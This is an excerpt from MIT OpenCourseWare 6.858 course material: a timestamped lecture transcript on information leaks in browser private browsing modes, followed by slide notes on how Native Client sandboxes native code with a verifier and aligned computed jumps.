and private browsing modes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:04</time_slice>
              <text_slice>And so eventually,
if you look at it,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:06</time_slice>
              <text_slice>there's actually quite a lot
of states that will actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:09</time_slice>
              <text_slice>potentially leak outside
of private browsing mode,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:11</time_slice>
              <text_slice>particularly if there's
user volition involved.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:14</time_slice>
              <text_slice>So it's interesting
to think about is</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:16</time_slice>
              <text_slice>this the right trade-off
between security and privacy?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:22</time_slice>
              <text_slice>So what's interesting is
that-- so the paper actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:25</time_slice>
              <text_slice>says that it's difficult to
sort of prevent a local attacker</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:32</time_slice>
              <text_slice>from detecting whether
or not you've been</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:34</time_slice>
              <text_slice>using private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:35</time_slice>
              <text_slice>And the paper was
a little bit vague</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:37</time_slice>
              <text_slice>about why this
might be the case.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:38</time_slice>
              <text_slice>So one reason why
this might be the case</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:40</time_slice>
              <text_slice>is because some of this
state that actually leaks</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:43</time_slice>
              <text_slice>from private browsing mode
to public browsing mode,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:46</time_slice>
              <text_slice>essentially it can
actually contain</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:47</time_slice>
              <text_slice>hints the state was generated
in private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:50</time_slice>
              <text_slice>So for example, on
Firefox and Chrome,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:53</time_slice>
              <text_slice>when you generate a bookmark
in private browsing mode,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:58</time_slice>
              <text_slice>that bookmark has a bunch
of metadata with it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:00</time_slice>
              <text_slice>So for example, the
time that it was visited</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:02</time_slice>
              <text_slice>and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:03</time_slice>
              <text_slice>So in many cases,
that metadata will</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:06</time_slice>
              <text_slice>be set to zero or
some null value</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:08</time_slice>
              <text_slice>if that bookmark was generated
inside of a private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:11</time_slice>
              <text_slice>mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:12</time_slice>
              <text_slice>So then later on if someone
controls your machine,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:14</time_slice>
              <text_slice>and they look at your
bookmark information--</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:16</time_slice>
              <text_slice>if they see this metadata set
to this zero and null value,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:19</time_slice>
              <text_slice>they can say, aha, that
bookmark was probably generated</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:22</time_slice>
              <text_slice>in private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:25</time_slice>
              <text_slice>So one thing to think
about is typically</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:28</time_slice>
              <text_slice>we talk about browser security.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:30</time_slice>
              <text_slice>We talk about, OK,
what can people do</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:32</time_slice>
              <text_slice>with JavaScript or HTML or CSS.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:34</time_slice>
              <text_slice>One thing you might
want to think about</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:35</time_slice>
              <text_slice>is, well, what can people do
with plug-ins or extensions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:38</time_slice>
              <text_slice>So in the context
of private browsing,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:40</time_slice>
              <text_slice>plug-ins and
extensions are quite</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:41</time_slice>
              <text_slice>interesting because they're
not constrained in most cases</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:46</time_slice>
              <text_slice>by the same origin policy.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:48</time_slice>
              <text_slice>They can constrain
stuff like JavaScript.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:49</time_slice>
              <text_slice>And what's interesting is that
these extensions and plug-ins</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:52</time_slice>
              <text_slice>typically run with
very high authority.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:54</time_slice>
              <text_slice>Loosely speaking, you can think
of them as like kernel modules.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:57</time_slice>
              <text_slice>They implement new
features directly</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:59</time_slice>
              <text_slice>inside the browsers themselves.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:01</time_slice>
              <text_slice>And so that's a
little bit problematic</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:03</time_slice>
              <text_slice>because these plug-ins
and extensions are often</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:05</time_slice>
              <text_slice>developed by someone who is
not the actual browser vendor.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:09</time_slice>
              <text_slice>So what that means
is that someone</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:10</time_slice>
              <text_slice>is trying to do something
nice and provide you</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:12</time_slice>
              <text_slice>with this nice value add in this
browser plug in or extension.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:15</time_slice>
              <text_slice>But that implementor
might not fully</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:17</time_slice>
              <text_slice>understand the context,
the security context,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:19</time_slice>
              <text_slice>in which that extension runs.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:22</time_slice>
              <text_slice>So that extension may not
implement private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:25</time_slice>
              <text_slice>semantics.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:26</time_slice>
              <text_slice>Or it may try to implement
it to do it in a bad way.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:29</time_slice>
              <text_slice>And so as I'll describe in
a couple of minutes, that's</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:33</time_slice>
              <text_slice>actually bad from the
security perspective</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:35</time_slice>
              <text_slice>because that means if we add
some of these new plug-ins</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:37</time_slice>
              <text_slice>or extensions, you
now can't strongly</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:39</time_slice>
              <text_slice>reason about what the
resulting [INAUDIBLE] are.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:42</time_slice>
              <text_slice>Now, one thing that's nice
is that plug-ins are actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:45</time_slice>
              <text_slice>probably going the
way of dinosaurs.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:47</time_slice>
              <text_slice>So as you probably know, HTML5
adds all these new features</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:50</time_slice>
              <text_slice>like the audio tag
and the videos tag,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:51</time_slice>
              <text_slice>and stuff like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:53</time_slice>
              <text_slice>And so a lot of these new
features were designed to allow</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:56</time_slice>
              <text_slice>people to get away
from plug-ins--</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:58</time_slice>
              <text_slice>to get away from Java--
to get away from Flash .</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:01</time_slice>
              <text_slice>So when people in the
past wanted do things</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:03</time_slice>
              <text_slice>like have rich 2D
or 3D graphics,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:06</time_slice>
              <text_slice>they'd have to do something
like Java or Flash.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:08</time_slice>
              <text_slice>Now they can use
things like Web GL.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:10</time_slice>
              <text_slice>They can used things
like the canvass tag.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:12</time_slice>
              <text_slice>So probably plug-ins
are going away.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:14</time_slice>
              <text_slice>In fact, the IE
team for example,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:16</time_slice>
              <text_slice>has said that in a
couple years they</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:17</time_slice>
              <text_slice>don't think anybody's going to
be using plug-ins whatsoever.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:20</time_slice>
              <text_slice>It's all going to
be HTML5 type stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:22</time_slice>
              <text_slice>In fact, if you go to YouTube--
I don't know if you've noticed.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:24</time_slice>
              <text_slice>But a lot of times if
you go to the video,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:26</time_slice>
              <text_slice>the video is actually using--
it's called an HTML5 player.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:30</time_slice>
              <text_slice>They've gone away from their
standard plugin-based one.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:34</time_slice>
              <text_slice>So that's very interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:35</time_slice>
              <text_slice>You can already see
sites trying to move</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:37</time_slice>
              <text_slice>towards this new plug-in world.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:39</time_slice>
              <text_slice>However, extensions
are probably here</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:40</time_slice>
              <text_slice>to stay for at least
the foreseeable future.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:42</time_slice>
              <text_slice>So it's still important
to get those right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:45</time_slice>
              <text_slice>So, yeah, the last thing
that I wanted to discuss</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:47</time_slice>
              <text_slice>is a paper was written in
2010-- that's four years ago.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:51</time_slice>
              <text_slice>So you might think
to yourself what's</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:52</time_slice>
              <text_slice>changed about private browsing?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:55</time_slice>
              <text_slice>And so at a high level,
private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:57</time_slice>
              <text_slice>is still tricky to get right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:59</time_slice>
              <text_slice>And the reason why it's
tricky to get right--</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:02</time_slice>
              <text_slice>a couple of reasons.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:03</time_slice>
              <text_slice>So first of all, because
the browser [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:05</time_slice>
              <text_slice>is still growing because of
things like this HTML5 stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:10</time_slice>
              <text_slice>The interface, which needs
to be secure with respect</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:13</time_slice>
              <text_slice>to private browsing
mode, that frontier</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:15</time_slice>
              <text_slice>is always getting bigger.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:17</time_slice>
              <text_slice>And also a lot of
times developers--</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:19</time_slice>
              <text_slice>they are more focused on to
adding cool, new features.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:22</time_slice>
              <text_slice>And then the
privacy implications</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:24</time_slice>
              <text_slice>get taken up later on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:26</time_slice>
              <text_slice>And so in practice, it is
still tricky to produce</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:29</time_slice>
              <text_slice>a private browsing mode which
catches all potential data</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:31</time_slice>
              <text_slice>leaks.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:33</time_slice>
              <text_slice>So one example, there
was a Firefox bug fix</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:37</time_slice>
              <text_slice>from January, 2014.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:39</time_slice>
              <text_slice>And the basic idea is
there is this extension--</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:44</time_slice>
              <text_slice>it's called pdf.js
is basically a way</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:49</time_slice>
              <text_slice>to look at PDF files using
pure HTML5 interfaces.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:55</time_slice>
              <text_slice>And so as it turns
out, this extension</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:58</time_slice>
              <text_slice>was allowing public mode cookies
to leak when it was being</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:03</time_slice>
              <text_slice>used in private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:06</time_slice>
              <text_slice>The idea is that let's
say that you visit</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:08</time_slice>
              <text_slice>some websites in public mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:10</time_slice>
              <text_slice>You want to download some PDF.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:11</time_slice>
              <text_slice>Maybe you get some
cookie that comes back.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:13</time_slice>
              <text_slice>You come back in
private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:15</time_slice>
              <text_slice>You want to view another
PDF from that site.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:17</time_slice>
              <text_slice>And then pdf.js is actually
sending those public mode</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:20</time_slice>
              <text_slice>cookies along with any private
mode things that were set.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:23</time_slice>
              <text_slice>And so in the lecture
notes, I actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:26</time_slice>
              <text_slice>have a link to the
bugzilla discussion</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:29</time_slice>
              <text_slice>about the particular bug.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:30</time_slice>
              <text_slice>So the fix was
actually quite simple</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:32</time_slice>
              <text_slice>once they realized
this was the problem.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:34</time_slice>
              <text_slice>Basically they just
have to add a check that</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:36</time_slice>
              <text_slice>says morally speaking, am
I in private browsing mode?</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:38</time_slice>
              <text_slice>If so, do some things--
and one of those things</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:41</time_slice>
              <text_slice>is not from the cookies.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:43</time_slice>
              <text_slice>So the fix here is
actually quite simple.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:45</time_slice>
              <text_slice>But the challenge was
that once again, people</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:49</time_slice>
              <text_slice>added this cool, new extension.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:51</time_slice>
              <text_slice>But it hadn't really
crossed their mind</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:53</time_slice>
              <text_slice>to do this full, invasive audit.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:57</time_slice>
              <text_slice>And say where are all
the places at which</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:00</time_slice>
              <text_slice>private browsing with
semantics might be impacted</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:03</time_slice>
              <text_slice>by this particular plug-in.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:05</time_slice>
              <text_slice>There's another
interesting one too</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:06</time_slice>
              <text_slice>this is actually
the discussion we</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:09</time_slice>
              <text_slice>had about 30 minutes ago
about what happens if you have</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:11</time_slice>
              <text_slice>private tabs and public tabs
where you open at the same time</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:14</time_slice>
              <text_slice>or very close to each other.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:15</time_slice>
              <text_slice>There is actually
a bug in Firefox.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:18</time_slice>
              <text_slice>I think that's from--
let's see here--</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:19</time_slice>
              <text_slice>yeah, 2011, which
is still unfilled.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:22</time_slice>
              <text_slice>And the basic idea
is that if you</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:24</time_slice>
              <text_slice>go to a task in private
browsing mode-- OK,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:27</time_slice>
              <text_slice>you go do some stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:28</time_slice>
              <text_slice>You then close that tab.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:31</time_slice>
              <text_slice>You then open a new
public mode tab.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:34</time_slice>
              <text_slice>And you go to about:memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:40</time_slice>
              <text_slice>So as you probably know, a
browser is defined as fake URLs</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:43</time_slice>
              <text_slice>and telling information
about how the browser works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:45</time_slice>
              <text_slice>So you go to the private
tab, close it up,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:47</time_slice>
              <text_slice>then go to about:memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:49</time_slice>
              <text_slice>This is going to
tell you information</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:51</time_slice>
              <text_slice>about all the objects that
Firefox has allocated.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:53</time_slice>
              <text_slice>So what would happen is that
window objects are typically</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:58</time_slice>
              <text_slice>deallocated-- they are
[INAUDIBLE] in Firefox.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:01</time_slice>
              <text_slice>So what ends up happening is
that when you open up that new</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:03</time_slice>
              <text_slice>public mode tab, go to
about:memory you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:06</time_slice>
              <text_slice>find information still about
that private mode window such</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:11</time_slice>
              <text_slice>as things like a
URL, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:13</time_slice>
              <text_slice>that will tell you how much
memory to allocate and all that</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:15</time_slice>
              <text_slice>kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:16</time_slice>
              <text_slice>And it's all in the plain text.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:17</time_slice>
              <text_slice>And so that's an example
of how these very subtle</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:20</time_slice>
              <text_slice>interfaces and browsers
that can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:22</time_slice>
              <text_slice>leak a lot of information.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:24</time_slice>
              <text_slice>And so it's very interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:26</time_slice>
              <text_slice>If you look at the
bugzilla discussion,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:28</time_slice>
              <text_slice>it's actually pretty interesting
to see how these problems get</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:31</time_slice>
              <text_slice>resolved in real life.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:32</time_slice>
              <text_slice>And I put a link it
so there is a message</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:35</time_slice>
              <text_slice>that this book was deprioritized
when it became clear</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:39</time_slice>
              <text_slice>that the potential solution
was more involved than</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:42</time_slice>
              <text_slice>originally anticipated.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:44</time_slice>
              <text_slice>So that's a pretty
long discussion</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:46</time_slice>
              <text_slice>about how do we fix this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:47</time_slice>
              <text_slice>And it involved changing the
way that garbage collection is</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:49</time_slice>
              <text_slice>done.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:49</time_slice>
              <text_slice>And it's very tricky because
if you invoke it too often</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:53</time_slice>
              <text_slice>then it gets performance.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:55</time_slice>
              <text_slice>So there's this long
discussion about this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:57</time_slice>
              <text_slice>So they said, "It
was deprioritized</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:58</time_slice>
              <text_slice>when it was clear the
solution was more involved</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:00</time_slice>
              <text_slice>than anticipated."</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:01</time_slice>
              <text_slice>And then in response,
a developer said,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:04</time_slice>
              <text_slice>"That is very sad to hear.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:06</time_slice>
              <text_slice>This could pretty much
defeat the purpose</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:08</time_slice>
              <text_slice>of things like session
store for getting</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:10</time_slice>
              <text_slice>about closed private windows."</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:12</time_slice>
              <text_slice>So the developers
about this stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:14</time_slice>
              <text_slice>Like in the case of
the session store,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:16</time_slice>
              <text_slice>this is storage
feature for HTML5--</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:19</time_slice>
              <text_slice>they had gone to
a lot of trouble</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:21</time_slice>
              <text_slice>to make it delete
things that belong</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:25</time_slice>
              <text_slice>to these closed private windows.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:28</time_slice>
              <text_slice>But, basically, what
this bug did-- it still--</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:30</time_slice>
              <text_slice>it basically still
left information</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:32</time_slice>
              <text_slice>about that stuff sitting
around in memory somewhere.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:35</time_slice>
              <text_slice>So long story short,
it's still very difficult</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:37</time_slice>
              <text_slice>to get private browsing right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:39</time_slice>
              <text_slice>And in fact, there are actually
off-the-shelf forensics tools</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:41</time_slice>
              <text_slice>that you can download
that will actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:43</time_slice>
              <text_slice>look for evidence of both public
and private browsing modes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:47</time_slice>
              <text_slice>So if you're an
attacker, you don't have</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:49</time_slice>
              <text_slice>to roll your own custom tool.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:50</time_slice>
              <text_slice>There's this one
they call Magnet.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:52</time_slice>
              <text_slice>I think it's an internet
evidence finder.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:54</time_slice>
              <text_slice>You just go get this thing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:55</time_slice>
              <text_slice>It'll do things like
look through your page</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:57</time_slice>
              <text_slice>file for RAM artifacts.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:59</time_slice>
              <text_slice>And it will give
you a very nice GUI.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:00</time_slice>
              <text_slice>It'll say here are
the images I found.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:02</time_slice>
              <text_slice>Here are the URLs.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:04</time_slice>
              <text_slice>So in practice, these
private browsing modes</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:07</time_slice>
              <text_slice>still do leak some information.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:08</time_slice>
              <text_slice>All right, so next section,
we'll talk about Tor.</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Sandboxing Native Code (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec7/</lecture_pdf_url>
      <lectureno>7</lectureno>
      <slides>
        <slide>
          <slideno>3</slideno>
          <text>But if interpreted starting from CD,	&#13; it's a 2-byte instr:
INT $0x80 # Linux syscall
 
Could	&#13; try	&#13; 
looking for disallowed	&#13; instructions	&#13; at every offset..
oLikely will generate too many false alarms.
oReal  instructions may accidentally  have some  "disallowed" bytes.
Reliable disassembly.
Plan:	&#13; ensure code executes
only instructions that	&#13; verifier knows about.
How can we	&#13; guarantee	&#13; this? Table	&#13; 1 and	&#13; Figure	&#13; 3 in paper.
Scan forward	&#13; through	&#13; all instructions,	&#13; starting	&#13; at the beginning.
If we see a jump instruction, make sure it's jumping to address we saw.
Easy	&#13; to ensure	&#13; for static jumps (constant addr).
Cannot	&#13; ensure statically for computed jumps (jump to addr from register)
Computed	&#13; jumps.
Idea is to rely on runtime instrumentation:
added checks before the jump.
For computed jump to %eax, NaCl	&#13; requires	&#13; the	&#13; following code:
AND $0xffffffe0, %eax
JMP *%eax 
 
This will ensure jumps go to multiples of 32 bytes.
NaCl also	&#13; requires	&#13; that no instructions	&#13; span	&#13; a 32 -byte boundary.
C
ompiler's	&#13; job is to ensure both of these rules.
oReplace every computed jump	&#13; with the two- instruction	&#13; sequence above.
oAdd NOP instructions if some other instruction might span 32-byte
boundary.
oAdd  NOPs  to pad to 32-byte multiple  if next instr is  a computed jump
target.
oAlways possible because NOP instruction is just one byte.
Verifier's	&#13; job is to	&#13; check these	&#13; rules.
oDuring disassembly, make sure no instruction spans a 32-byte boundary.
oFor computed jumps, ensure it's in a two-instruction	&#13; sequence as	&#13; above.
What	&#13; will	&#13; this guarante
e?
oVerifier checked	&#13; all instructions	&#13; starting at 32 -byte-multiple	&#13; addresses.
oComputed	&#13; jumps can only
go to 32-byte-multiple	&#13; addresses.
What prevents the module from jumping past
the AND, directly to the JMP?
oPseudo-instruction.
How does NaCl
deal with	&#13; RET	&#13; instructions?
oProhibited	&#13;  -- effectively a computed jump, with address stored on stack.
oInstead, compiler must generate explicit POP + computed jump code.
Why are the rules from Table 1 necessary?
4</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>Browser interface via NPAPI: DOM access, open URLs, user input, ..
No networking:	&#13; can	&#13; use	&#13; Javascript to	&#13; access	&#13; network according	&#13; to	&#13; SOP.
How secure	&#13; is Native	&#13; 
Client?
List of attack surfaces: start of section	&#13; 2.3.
Inner sandbox: validator has to be correct (had some tricky bugs!).
Outer sandbox: OS -dependent plan.
oOn
Linux, probably seccomp.
oOn FreeBSD (if NaCl	&#13; supported it), Capsicum	&#13; would make sense.
Why the oute
r sandbox?
oPossible	&#13; bugs	&#13; in the	&#13; inner sandbox.
What could an adversary do if
they compromise the inner sandbox?
oExploit CPU	&#13; bugs.
oExploit OS kernel	&#13; bugs.
oExploit bugs in other processes communicating with the sandbox proc.
Service runtime: initial loader, runtime trampoline
interfaces.
IMC interface + NPAPI: complex code, can (and did) have bugs.
How	&#13; well does it perform?
CPU	&#13; overhead seems to be dominated by NaCl's	&#13; code alignment requirements.
oLarger	&#13; instruction cache	&#13; footprint.
oBut for some applications, NaCl's	&#13; alignment works better than gcc's.
Minimal overhead for added checks on
computed jumps.
